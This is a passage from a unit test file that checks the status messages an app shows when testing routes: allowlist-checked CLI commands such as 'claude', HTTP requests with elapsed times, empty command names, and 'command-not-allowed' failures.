    /*
     * A CLI route is checked against the allowlist rather than run, so a
     * duration and an "answered" would both describe a request that was never
     * made.
     */
    const line = testSummary({ kind: "passed", elapsedMs: 3 }, cli);

    expect(line).toBe("claude is a program this build will run.");
    expect(line).not.toContain("ms");
    expect(line).not.toContain("answered");
  });

  it("says it is checking rather than trying", () => {
    expect(testSummary({ kind: "running" }, cli)).toBe("Checking this program…");
  });

  it("keeps the request wording for an HTTP route", () => {
    expect(testSummary({ kind: "passed", elapsedMs: 412 })).toContain("412 ms");
  });

  it("falls back rather than naming an empty program", () => {
    expect(
      testSummary({ kind: "passed", elapsedMs: 3 }, { isCli: true, command: "" })
    ).toBe("That program is a program this build will run.");
  });

  it("reports a failure the same way whichever route it was", () => {
    expect(testSummary({ kind: "failed", code: "command-not-allowed" }, cli)).toBe(
      "That program is not one this app will run."
    );
  });
});

